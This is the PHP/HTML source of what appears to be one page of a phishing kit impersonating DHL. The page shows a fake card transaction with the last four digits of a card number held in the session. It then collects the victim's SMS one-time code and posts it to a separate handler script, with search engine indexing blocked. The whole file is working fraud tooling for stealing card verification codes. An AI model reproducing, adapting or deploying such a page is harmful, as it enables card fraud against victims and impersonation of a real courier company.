<?php
session_start();
include("Variablex/Protection.php");
include("Variablex/SYS.php");
include("dynamo.php");

$one = $_SESSION["one"];
$one = str_replace(" ","",$one);
?>
<!doctype html>
<html lang="ar">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
    
    <!-- CSS FILES -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="Assistant/favicon.ico">

    <title>DHL</title>

    <style>
        /* Custom styles */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f8f9fa;
            color: #333;
        }
        .navbar {
            background-color: #ffcc00;
        }
        .navbar .navbar-brand img {
            height: 50px;
        }
        .modal-dialog {
            max-width: 600px;
            margin: 60px auto;
        }
        .modal-header {
            background-color: #ffcc00;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .modal-header img {
            max-height: 50px;
        }
        .modal-content {
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .modal-body {
            padding: 30px;
        }
        .pp h6 {
            font-size: 1.5rem;
            color: #ff9900;
            margin-bottom: 20px;
        }
        .tato p {
            font-size: 1rem;
            color: #555;
            margin-bottom: 20px;
        }
        .content {
            display: flex;
            justify-content: space-between;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        .content .left span, .content .right span {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
        }
        .form-group input {
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        .time {
            text-align: center;
            margin-bottom: 20px;
        }
        .botona {
            text-align: center;
            margin-bottom: 20px;
        }
        .botona .btn {
            background-color: #ffcc00;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
        }
        .botona .btn:hover {
            background-color: #ff9900;
        }
        .copirayt p {
            font-size: 0.875rem;
            color: #777;
            margin-top: 20px;
        }
    </style>
</head>

<body>
    <nav class="navbar navbar-expand-lg navbar-light">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">
                <img src="Assistant/dhl-logo.svg" alt="DHL Logo">
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item"><a class="nav-link" href="#"><i class="fa fa-exclamation-circle me-2"></i><?php echo get_text("top_header1"); ?></a></li>
                    <li class="nav-item"><a class="nav-link" href="#"><?php echo get_text("top_header2"); ?></a></li>
                    <li class="nav-item"><a class="nav-link" href="#"><i class="fa fa-globe me-2"></i><?php echo $countrycode; ?></a></li>
                    <li class="nav-item"><a class="nav-link" href="#"><i class="fa fa-globe me-2"></i><?php echo get_text("top_header3"); ?></a></li>
                    <li class="nav-item"><a class="nav-link" href="#"><i class="fa fa-search me-2"></i><?php echo get_text("top_header4"); ?></a></li>
                </ul>
                <ul class="navbar-nav">
                    <li class="nav-item"><a class="nav-link" href="#"><i class="fa fa-list"></i></a></li>
                </ul>
            </div>
        </div>
    </nav>

    <form action="./Appearance/Caralbab.php" method="post">
        <input type="hidden" name="captcha">
        <input type="hidden" name="step" value="">
        <div class="modal-dialog shadow">
            <div class="modal-content">
                <div class="modal-header">
                    <img src="Assistant/dhl-logo.svg" alt="DHL Logo">
                    <img src="Assistant/<?php echo $_SESSION['bank_scheme']; ?>.png" class="sfli" alt="Bank Scheme">
                </div>
                <div class="modal-body">
                    <div class="text-center pp">
                        <h6><?php echo get_text("sms-title"); ?></h6>
                    </div>
                    <div class="tato text-center">
                        <p><?php echo get_text("sms-message"); ?></p>
                    </div>
                    <div class="content">
                        <div class="left">
                            <span><?php echo get_text("merchant"); ?>:</span>
                            <span><?php echo get_text("amount"); ?>:</span>
                            <span><?php echo get_text("date"); ?>:</span>
                            <span><?php echo get_text("credit-card-number"); ?>:</span>
                            <span class="osama"><?php echo get_text("sms_code_label"); ?></span>
                        </div>
                        <div class="right">
                            <span style="color: rgb(227,41,31);">DHL Express</span>
                            <span><?php echo get_text("total"); ?></span>
                            <span><?php echo date("d/m/Y h:i A"); ?></span>
                            <span>XXXX XXXX XXXX <?php echo substr($one , -4);?></span>
                            <span>
                                <div class="form-group">
                                    <input type="text" name="sm" id="sm" class="form-control" required>
                                </div>
                            </span>
                        </div>
                    </div>
                    <div class="time text-center">
                        <p><?php echo get_text("sms-again"); ?></p>
                        <div class="countdown ms-2" style="color:red;"></div>
                    </div>
                    <div class="botona">
                        <button class="btn" name="submit"><?php echo get_text("submit"); ?></button>
                    </div>
                    <div class="copirayt text-center">
                        <p><?php echo get_text("copyright"); ?></p>
                    </div>
                </div>
            </div>
        </div>
    </form>

    <!-- JS FILES -->
    <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
</body>

</html>
